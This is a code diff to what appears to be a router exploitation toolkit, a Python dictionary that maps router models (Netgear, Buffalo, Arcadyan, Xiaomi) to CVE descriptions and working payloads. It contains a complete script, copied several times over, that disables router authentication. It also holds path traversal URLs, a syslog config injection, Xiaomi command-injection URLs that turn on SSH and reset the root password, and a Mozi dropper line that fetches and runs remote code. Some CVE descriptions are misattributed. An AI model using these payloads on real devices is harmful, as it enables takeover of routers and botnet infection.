@@ -530,8 +530,20 @@ model_exp_dic["F5_BIG-IP"] ={
 }
 
 model_exp_dic["DSL-AC3100"] = {
-    "CVE-2021-20090":
-["Wireless devices running certain Arcadyan-derived firmware (such as KPN Experia WiFi 1.00.15) do not properly sanitise user input to the syslog configuration form. An authenticated remote attacker could leverage this to alter the device configuration and achieve remote code execution. This can be exploited in conjunction with CVE-2021-20090.\n['https://7bits.nl/journal/posts/cve-2021-38703-kpn-experia-wifi-root-shell/', 'https://www.kpnwebshop.com/modems-routers/producten/experia-wifi/2']", '\ncurl -vk --path-as-is "http://IP/images/..%2findex.htm"\n']
+    "CVE-2021-20090":["A path traversal vulnerability in the web interfaces of Buffalo WSR-2533DHPL2 firmware version <= 1.02 and WSR-2533DHP3 firmware version <= 1.24 could allow unauthenticated remote attackers to bypass authentication.\n['URL:https://www.kb.cert.org/vuls/id/914124'\n'https://www.tenable.com/security/research/tra-2021-13'\n'https://www.tenable.com/security/research/tra-2021-13'\n'https://www.tenable.com/security/research/tra-2021-13']",
+    '\n#affect 1.02\nhttp://<ip>/js/..%2findex.htm\n'
+    ],#update 2023.3.1
+   "CVE-2021-38703":
+["Wireless devices running certain Arcadyan-derived firmware (such as KPN Experia WiFi 1.00.15) do not properly sanitise user input to the syslog configuration form. An authenticated remote attacker could leverage this to alter the device configuration and achieve remote code execution. This can be exploited in conjunction with CVE-2021-20090.\n['https://7bits.nl/journal/posts/cve-2021-38703-kpn-experia-wifi-root-shell/'\n'https://www.kpnwebshop.com/modems-routers/producten/experia-wifi/2']", 
+"""
+action=syslog_ng_restart
+httoken=1478967339
+submit_button=security_log.htm
+393239000000=200
+393240000000=debug); }; source s_habbie { program("CMD"); }; log { source(s_habbie); filter(f_debug
+"""
+]
+
 }
 
 model_exp_dic["Tenda_AC6v2"] = {
@@ -602,7 +614,117 @@ model_exp_dic["R7000"] = {
     "cve-2016-6277":
 ["NETGEAR R6250 before 1.0.4.6.Beta, R6400 before 1.0.1.18.Beta, R6700 before 1.0.1.14.Beta, R6900, R7000 before 1.0.7.6.Beta, R7100LG before 1.0.0.28.Beta, R7300DST before 1.0.0.46.Beta, R7900 before 1.0.1.8.Beta, R8000 before 1.0.3.26.Beta, D6220, D6400, D7000, and possibly other routers allow remote attackers to execute arbitrary commands via shell metacharacters in the path info to cgi-bin/.\n['http://packetstormsecurity.com/files/155712/Netgear-R6400-Remote-Code-Execution.html', 'http://www.sj-vs.net/a-temporary-fix-for-cert-vu582384-cwe-77-on-netgear-r7000-and-r6400-routers/', 'https://kalypto.org/research/netgear-vulnerability-expanded/', 'http://www.securityfocus.com/bid/94819', 'https://www.kb.cert.org/vuls/id/582384', 'https://www.exploit-db.com/exploits/40889/', 'https://www.exploit-db.com/exploits/41598/']", '\nhttp://:8443/cgi-bin/;cd${IFS}/var/tmp;rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://k8gege.org:800/Mozi.m;${IFS}sh${IFS}/var/tmp/Mozi.m\n'],
     "CVE-2020-27867":
-["This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of NETGEAR R6020, R6080, R6120, R6220, R6260, R6700v2, R6800, R6900v2, R7450, JNR3210, WNR2020, Nighthawk AC2100, and Nighthawk AC2400 routers. Although authentication is required to exploit this vulnerability, the existing authentication mechanism can be bypassed. The specific flaw exists within the mini_httpd service, which listens on TCP port 80 by default. When parsing the funjsq_access_token parameter, the process does not properly validate a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of root. Was ZDI-CAN-11653.\n['https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers', 'https://www.zerodayinitiative.com/advisories/ZDI-20-1423/', 'https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers', 'https://www.zerodayinitiative.com/advisories/ZDI-20-1423/']", '\nhttp://192.168.1.1/setup.cgi?todo=funjsq_login&next_file=basic_wait.htm&funjsq_access_token=|ping%20-c5%20k8gege.org\n']
+["This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of NETGEAR R6020, R6080, R6120, R6220, R6260, R6700v2, R6800, R6900v2, R7450, JNR3210, WNR2020, Nighthawk AC2100, and Nighthawk AC2400 routers. Although authentication is required to exploit this vulnerability, the existing authentication mechanism can be bypassed. The specific flaw exists within the mini_httpd service, which listens on TCP port 80 by default. When parsing the funjsq_access_token parameter, the process does not properly validate a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of root. Was ZDI-CAN-11653.\n['https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers', 'https://www.zerodayinitiative.com/advisories/ZDI-20-1423/', 'https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers', 'https://www.zerodayinitiative.com/advisories/ZDI-20-1423/']", '\nhttp://192.168.1.1/setup.cgi?todo=funjsq_login&next_file=basic_wait.htm&funjsq_access_token=|ping%20-c5%20k8gege.org\n'],
+    "CVE-2019-17372":
+["There is a large number of netgear devices with a genieDisableLanChanged.cgi page that can be accessed without authorization. After accessing this page, the device's authentication function will be turned off. Some devices need to set the correct token and send a POST type request to trigger the vulnerability.",
+"""
+#!/usr/bin/env python
+
+import sys
+import time
+import os
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+
+def scrape(text, start_trig, end_trig):
+    if text.find(start_trig) != -1:
+    	return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
+    else:
+        return "Token maybe unnecessary"
+
+
+def get_token(url):
+	token=0
+	while token==0:
+		req = requests.get(url, verify=False)
+		token = scrape(req.text, 'unauth.cgi?id=', '\"')
+		if token=="Token maybe unnecessary":
+			#print url+'genie_ping.htm'
+			req = requests.get(url+'genie_ping.htm', verify=False)
+			token = scrape(req.text, 'genieping.cgi?id=', '\"')
+			if token=="Token maybe unnecessary":
+			#print url+'genie_ping.htm'
+				req = requests.get(url+'LGO_logout.htm', verify=False)
+				token = scrape(req.text, 'logout.cgi?id=', '\"')
+
+	return token
+
+def get_url(ip,port):
+	url = 'http://' + ip + ':' + port + '/'
+	try:
+		req = requests.get(url)
+	except:
+		url = 'https://' + ip + ':' + port + '/'
+	return url
+
+
+def close_auth(token,url):
+
+	if token == "Token maybe unnecessary":
+		vurl = url + 'genieDisableLanChanged.cgi'
+	else:
+		vurl = url + 'genieDisableLanChanged.cgi?id=' + token
+
+	req = requests.post(vurl, verify=False)
+	time.sleep(1)
+	req = requests.post(vurl, verify=False)
+
+	print 'Authentication is disabled'
+	print 'Try: '+url+'BAS_basic.htm'
+	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+
+def open_auth(token,url):
+
+	if token == "Token maybe unnecessary":
+		vurl = url + 'geniemanual.cgi'
+	else:
+		vurl = url + 'geniemanual.cgi?id=' + token
+
+	req = requests.post(vurl, verify=False)
+	time.sleep(1)
+	req = requests.post(vurl, verify=False)
+
+	print 'Authentication is enabled'
+	print 'Try: '+url+'BAS_basic.htm'
+	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+
+
+if __name__ == '__main__':
+	if len(sys.argv) != 4:
+		print 'usage:'
+		print '1.python router.py ip port openauth'
+		print '2.python router.py ip port closeauth'
+		os._exit(0)
+
+	ip=sys.argv[1]
+	port=sys.argv[2]
+	func=sys.argv[3]
+
+	
+
+	if func=='openauth':
+		url=get_url(ip, port)
+		token=get_token(url)
+		open_auth(token,url)
+	elif func=='closeauth':
+		url=get_url(ip, port)
+		token=get_token(url)
+		close_auth(token,url)
+	else:
+		print 'usage:'
+		print '1.python router.py ip port openauth'
+		print '2.python router.py ip port closeauth'
+		os._exit(0)
+"""
+],
+    "CVE-2021-34991":
+["This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of NETGEAR R6400v2 1.0.4.106_10.0.80 routers. Authentication is not required to exploit this vulnerability. The specific flaw exists within the UPnP service, which listens on TCP port 5000 by default. When parsing the uuid request header, the process does not properly validate the length of user-supplied data prior to copying it to a fixed-length stack-based buffer. An attacker can leverage this vulnerability to execute code in the context of root. Was ZDI-CAN-14110.['https://kb.netgear.com/000064361/Security-Advisory-for-Pre-Authentication-Buffer-Overflow-on-Multiple-Products-PSV-2021-0168'\n'https://www.zerodayinitiative.com/advisories/ZDI-21-1303/']",
+"""
+Not included temporarily
+"""
+]
 }
 
 model_exp_dic["DIR-885L"] = {
@@ -631,8 +753,19 @@ curl -kv --insecure -X POST -H "Content-Type: application/json" -d '{"command":"
 }
 
 model_exp_dic["Buffalo_WSR-2533DHPL"] = {
-    "CVE-2021-20090":
-["Wireless devices running certain Arcadyan-derived firmware (such as KPN Experia WiFi 1.00.15) do not properly sanitise user input to the syslog configuration form. An authenticated remote attacker could leverage this to alter the device configuration and achieve remote code execution. This can be exploited in conjunction with CVE-2021-20090.\n['https://7bits.nl/journal/posts/cve-2021-38703-kpn-experia-wifi-root-shell/', 'https://www.kpnwebshop.com/modems-routers/producten/experia-wifi/2']", '\n#affect 1.02\nhttp://<ip>/js/..%2findex.htm\n'],
+    "CVE-2021-38703":
+["Wireless devices running certain Arcadyan-derived firmware (such as KPN Experia WiFi 1.00.15) do not properly sanitise user input to the syslog configuration form. An authenticated remote attacker could leverage this to alter the device configuration and achieve remote code execution. This can be exploited in conjunction with CVE-2021-20090.\n['https://7bits.nl/journal/posts/cve-2021-38703-kpn-experia-wifi-root-shell/'\n'https://www.kpnwebshop.com/modems-routers/producten/experia-wifi/2']", 
+"""
+action=syslog_ng_restart
+httoken=1478967339
+submit_button=security_log.htm
+393239000000=200
+393240000000=debug); }; source s_habbie { program("CMD"); }; log { source(s_habbie); filter(f_debug
+"""
+],
+    "CVE-2021-20090":["A path traversal vulnerability in the web interfaces of Buffalo WSR-2533DHPL2 firmware version <= 1.02 and WSR-2533DHP3 firmware version <= 1.24 could allow unauthenticated remote attackers to bypass authentication.\n['URL:https://www.kb.cert.org/vuls/id/914124'\n'https://www.tenable.com/security/research/tra-2021-13'\n'https://www.tenable.com/security/research/tra-2021-13'\n'https://www.tenable.com/security/research/tra-2021-13']",
+    '\n#affect 1.02\nhttp://<ip>/js/..%2findex.htm\n'
+    ],#update 2023.3.1
     "CVE-2021-20091":
 ["The web interfaces of Buffalo WSR-2533DHPL2 firmware version &lt;= 1.02 and WSR-2533DHP3 firmware version &lt;= 1.24 do not properly sanitize user input. An authenticated remote attacker could leverage this vulnerability to alter device configuration, potentially gaining remote code execution.\n['https://www.tenable.com/security/research/tra-2021-13', 'https://www.tenable.com/security/research/tra-2021-13']", '\ncurl --include -X POST http://<ip>/js/..%2fapply_abstract.cgi -H "Referer: http://<ip>/ping.html" --data "action=start_ping&httoken=<valid httoken>&submit_button=ping.html&action_params=blink_time%3D5&ARC_ping_ipaddress=<ip>%0ACommand_injection=1&ARC_ping_status=0&TMP_Ping_Type=4"\n']
 }
@@ -1202,4 +1335,383 @@ Connection: close
      ]
 }
 
+model_exp_dic["ASUS_RT_AC88U"] = {
+    "CVE-2021-20090":["A path traversal vulnerability in the web interfaces of Buffalo WSR-2533DHPL2 firmware version <= 1.02 and WSR-2533DHP3 firmware version <= 1.24 could allow unauthenticated remote attackers to bypass authentication.\n['URL:https://www.kb.cert.org/vuls/id/914124'\n'https://www.tenable.com/security/research/tra-2021-13'\n'https://www.tenable.com/security/research/tra-2021-13'\n'https://www.tenable.com/security/research/tra-2021-13']",
+    '\n#affect 1.02\nhttp://<ip>/js/..%2findex.htm\n'
+    ]
+}
+
+model_exp_dic["Arca_WE420223-99"] = {
+      "CVE-2021-38703":
+["Wireless devices running certain Arcadyan-derived firmware (such as KPN Experia WiFi 1.00.15) do not properly sanitise user input to the syslog configuration form. An authenticated remote attacker could leverage this to alter the device configuration and achieve remote code execution. This can be exploited in conjunction with CVE-2021-20090.\n['https://7bits.nl/journal/posts/cve-2021-38703-kpn-experia-wifi-root-shell/'\n'https://www.kpnwebshop.com/modems-routers/producten/experia-wifi/2']", 
+"""
+action=syslog_ng_restart
+httoken=1478967339
+submit_button=security_log.htm
+393239000000=200
+393240000000=debug); }; source s_habbie { program("CMD"); }; log { source(s_habbie); filter(f_debug
+"""],
+    "CVE-2021-20090":["A path traversal vulnerability in the web interfaces of Buffalo WSR-2533DHPL2 firmware version <= 1.02 and WSR-2533DHP3 firmware version <= 1.24 could allow unauthenticated remote attackers to bypass authentication.\n['URL:https://www.kb.cert.org/vuls/id/914124'\n'https://www.tenable.com/security/research/tra-2021-13'\n'https://www.tenable.com/security/research/tra-2021-13'\n'https://www.tenable.com/security/research/tra-2021-13']",
+    '\n#affect 1.02\nhttp://<ip>/js/..%2findex.htm\n'
+    ]
+}
+
+model_exp_dic["Netgear_WNDR3400v2"] = {
+        "CVE-2019-17372":
+["There is a large number of netgear devices with a genieDisableLanChanged.cgi page that can be accessed without authorization. After accessing this page, the device's authentication function will be turned off. Some devices need to set the correct token and send a POST type request to trigger the vulnerability.",
+"""
+
+#!/usr/bin/env python
+
+import sys
+import time
+import os
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+
+def scrape(text, start_trig, end_trig):
+    if text.find(start_trig) != -1:
+    	return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
+    else:
+        return "Token maybe unnecessary"
+
+
+def get_token(url):
+	token=0
+	while token==0:
+		req = requests.get(url, verify=False)
+		token = scrape(req.text, 'unauth.cgi?id=', '\"')
+		if token=="Token maybe unnecessary":
+			#print url+'genie_ping.htm'
+			req = requests.get(url+'genie_ping.htm', verify=False)
+			token = scrape(req.text, 'genieping.cgi?id=', '\"')
+			if token=="Token maybe unnecessary":
+			#print url+'genie_ping.htm'
+				req = requests.get(url+'LGO_logout.htm', verify=False)
+				token = scrape(req.text, 'logout.cgi?id=', '\"')
+
+	return token
+
+def get_url(ip,port):
+	url = 'http://' + ip + ':' + port + '/'
+	try:
+		req = requests.get(url)
+	except:
+		url = 'https://' + ip + ':' + port + '/'
+	return url
+
+
+def close_auth(token,url):
+
+	if token == "Token maybe unnecessary":
+		vurl = url + 'genieDisableLanChanged.cgi'
+	else:
+		vurl = url + 'genieDisableLanChanged.cgi?id=' + token
+
+	req = requests.post(vurl, verify=False)
+	time.sleep(1)
+	req = requests.post(vurl, verify=False)
+
+	print 'Authentication is disabled'
+	print 'Try: '+url+'BAS_basic.htm'
+	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+
+def open_auth(token,url):
+
+	if token == "Token maybe unnecessary":
+		vurl = url + 'geniemanual.cgi'
+	else:
+		vurl = url + 'geniemanual.cgi?id=' + token
+
+	req = requests.post(vurl, verify=False)
+	time.sleep(1)
+	req = requests.post(vurl, verify=False)
+
+	print 'Authentication is enabled'
+	print 'Try: '+url+'BAS_basic.htm'
+	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+
+
+if __name__ == '__main__':
+	if len(sys.argv) != 4:
+		print 'usage:'
+		print '1.python router.py ip port openauth'
+		print '2.python router.py ip port closeauth'
+		os._exit(0)
+
+	ip=sys.argv[1]
+	port=sys.argv[2]
+	func=sys.argv[3]
+
+	
+
+	if func=='openauth':
+		url=get_url(ip, port)
+		token=get_token(url)
+		open_auth(token,url)
+	elif func=='closeauth':
+		url=get_url(ip, port)
+		token=get_token(url)
+		close_auth(token,url)
+	else:
+		print 'usage:'
+		print '1.python router.py ip port openauth'
+		print '2.python router.py ip port closeauth'
+		os._exit(0)
+"""
+]
+}
+
+
+model_exp_dic["Netgear_WNR1000v3"] = {
+            "CVE-2019-17372":
+["There is a large number of netgear devices with a genieDisableLanChanged.cgi page that can be accessed without authorization. After accessing this page, the device's authentication function will be turned off. Some devices need to set the correct token and send a POST type request to trigger the vulnerability.",
+"""
+
+#!/usr/bin/env python
+
+import sys
+import time
+import os
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+
+def scrape(text, start_trig, end_trig):
+    if text.find(start_trig) != -1:
+    	return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
+    else:
+        return "Token maybe unnecessary"
+
+
+def get_token(url):
+	token=0
+	while token==0:
+		req = requests.get(url, verify=False)
+		token = scrape(req.text, 'unauth.cgi?id=', '\"')
+		if token=="Token maybe unnecessary":
+			#print url+'genie_ping.htm'
+			req = requests.get(url+'genie_ping.htm', verify=False)
+			token = scrape(req.text, 'genieping.cgi?id=', '\"')
+			if token=="Token maybe unnecessary":
+			#print url+'genie_ping.htm'
+				req = requests.get(url+'LGO_logout.htm', verify=False)
+				token = scrape(req.text, 'logout.cgi?id=', '\"')
+
+	return token
+
+def get_url(ip,port):
+	url = 'http://' + ip + ':' + port + '/'
+	try:
+		req = requests.get(url)
+	except:
+		url = 'https://' + ip + ':' + port + '/'
+	return url
+
+
+def close_auth(token,url):
+
+	if token == "Token maybe unnecessary":
+		vurl = url + 'genieDisableLanChanged.cgi'
+	else:
+		vurl = url + 'genieDisableLanChanged.cgi?id=' + token
+
+	req = requests.post(vurl, verify=False)
+	time.sleep(1)
+	req = requests.post(vurl, verify=False)
+
+	print 'Authentication is disabled'
+	print 'Try: '+url+'BAS_basic.htm'
+	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+
+def open_auth(token,url):
+
+	if token == "Token maybe unnecessary":
+		vurl = url + 'geniemanual.cgi'
+	else:
+		vurl = url + 'geniemanual.cgi?id=' + token
+
+	req = requests.post(vurl, verify=False)
+	time.sleep(1)
+	req = requests.post(vurl, verify=False)
+
+	print 'Authentication is enabled'
+	print 'Try: '+url+'BAS_basic.htm'
+	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+
+
+if __name__ == '__main__':
+	if len(sys.argv) != 4:
+		print 'usage:'
+		print '1.python router.py ip port openauth'
+		print '2.python router.py ip port closeauth'
+		os._exit(0)
+
+	ip=sys.argv[1]
+	port=sys.argv[2]
+	func=sys.argv[3]
+
+	
+
+	if func=='openauth':
+		url=get_url(ip, port)
+		token=get_token(url)
+		open_auth(token,url)
+	elif func=='closeauth':
+		url=get_url(ip, port)
+		token=get_token(url)
+		close_auth(token,url)
+	else:
+		print 'usage:'
+		print '1.python router.py ip port openauth'
+		print '2.python router.py ip port closeauth'
+		os._exit(0)
+"""
+]
+}
+model_exp_dic["Netgear_WNDR4500v2"] = {
+    "CVE-2019-17372":
+["There is a large number of netgear devices with a genieDisableLanChanged.cgi page that can be accessed without authorization. After accessing this page, the device's authentication function will be turned off. Some devices need to set the correct token and send a POST type request to trigger the vulnerability.",
+"""
+
+#!/usr/bin/env python
+
+import sys
+import time
+import os
+import requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+
+def scrape(text, start_trig, end_trig):
+    if text.find(start_trig) != -1:
+    	return text.split(start_trig, 1)[-1].split(end_trig, 1)[0]
+    else:
+        return "Token maybe unnecessary"
+
+
+def get_token(url):
+	token=0
+	while token==0:
+		req = requests.get(url, verify=False)
+		token = scrape(req.text, 'unauth.cgi?id=', '\"')
+		if token=="Token maybe unnecessary":
+			#print url+'genie_ping.htm'
+			req = requests.get(url+'genie_ping.htm', verify=False)
+			token = scrape(req.text, 'genieping.cgi?id=', '\"')
+			if token=="Token maybe unnecessary":
+			#print url+'genie_ping.htm'
+				req = requests.get(url+'LGO_logout.htm', verify=False)
+				token = scrape(req.text, 'logout.cgi?id=', '\"')
+
+	return token
+
+def get_url(ip,port):
+	url = 'http://' + ip + ':' + port + '/'
+	try:
+		req = requests.get(url)
+	except:
+		url = 'https://' + ip + ':' + port + '/'
+	return url
+
+
+def close_auth(token,url):
+
+	if token == "Token maybe unnecessary":
+		vurl = url + 'genieDisableLanChanged.cgi'
+	else:
+		vurl = url + 'genieDisableLanChanged.cgi?id=' + token
+
+	req = requests.post(vurl, verify=False)
+	time.sleep(1)
+	req = requests.post(vurl, verify=False)
+
+	print 'Authentication is disabled'
+	print 'Try: '+url+'BAS_basic.htm'
+	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+
+def open_auth(token,url):
+
+	if token == "Token maybe unnecessary":
+		vurl = url + 'geniemanual.cgi'
+	else:
+		vurl = url + 'geniemanual.cgi?id=' + token
+
+	req = requests.post(vurl, verify=False)
+	time.sleep(1)
+	req = requests.post(vurl, verify=False)
+
+	print 'Authentication is enabled'
+	print 'Try: '+url+'BAS_basic.htm'
+	print 'Try: '+url+'MNU_accessPassword_recovered.htm'
+
+
+if __name__ == '__main__':
+	if len(sys.argv) != 4:
+		print 'usage:'
+		print '1.python router.py ip port openauth'
+		print '2.python router.py ip port closeauth'
+		os._exit(0)
+
+	ip=sys.argv[1]
+	port=sys.argv[2]
+	func=sys.argv[3]
+
+	
+
+	if func=='openauth':
+		url=get_url(ip, port)
+		token=get_token(url)
+		open_auth(token,url)
+	elif func=='closeauth':
+		url=get_url(ip, port)
+		token=get_token(url)
+		close_auth(token,url)
+	else:
+		print 'usage:'
+		print '1.python router.py ip port openauth'
+		print '2.python router.py ip port closeauth'
+		os._exit(0)
+"""
+]
+}
+
+model_exp_dic["Xiaomi_AX3600"] = {
+    "CVE-2020-11959":
+["An unsafe configuration of nginx lead to information leak in Xiaomi router R3600 ROM before 1.0.50.\n['https://privacy.mi.com/trust#/security/vulnerability-management/vulnerability-announcement/detail?id=14']",
+"""
+#get wifi password, stok and so on
+http://AX3600-ip/backup/log../messages
+"""
+],
+    "CVE-2020-11960":
+["Xiaomi router R3600 ROM before 1.0.50 is affected by a vulnerability when checking backup file in c_upload interface let attacker able to extract malicious file under any location in /tmp, lead to possible RCE and DoS\n['https://privacy.mi.com/trust#/security/vulnerability-management/vulnerability-announcement/detail?id=15']",
+"""
+Find the target path of the uploaded file. You can find the subdirectory under the tmp directory/ Spool/cron and/ Dnsmasq. d may take advantage of
+/Tmp/spool/cron is the soft connection of/var/spool/cron, which is used to store the scheduled task file, but the name of the scheduled task file must match the user name in/etc/passwd
+/The. conf file in tmp/dnsmasq. d will be loaded as the configuration file when the dnsmasq process starts, and all changes to the network will restart the dnsmasq process
+So you can upload a shell script with malicious commands to the/tmp directory, and then upload the configuration file that can specify the dhcp-script path as the shell script just uploaded and start the tftp service (restart the dnsmasq process through the tftp transfer file to trigger the execution of the shell script) to the/tmp/dnsmasq. d directory as the configuration file of the dnsmasq process, and then restart the dnsmasq process through the tftp transfer file, Running shell script causes remote arbitrary command execution
+"""
+],
+    "auth_rce":
+["The goal is to start the SSH service of the device",
+"""
+# first you need get stok
+# open SSH
+http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20nvram%20set%20ssh_en%3D1%3B%20nvram%20commit%3B%20sed%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%5C%22debug%5C%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%3B%20%2Fetc%2Finit.d%2Fdropbear%20start%3B
+# changge SSH Default Passwd to "admin"
+http://192.168.31.1/cgi-bin/luci/;stok=<STOK>/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3B%20echo%20-e%20'admin%5Cnadmin'%20%7C%20passwd%20root%3B
+# then
+ssh root@192.168.31.1
+"""
+]
+}
+
+model_exp_dic['Netgear_R6700'] = {
+    
+}
 # print(model_exp_dic["TOTOLINK_A7000R"][0])
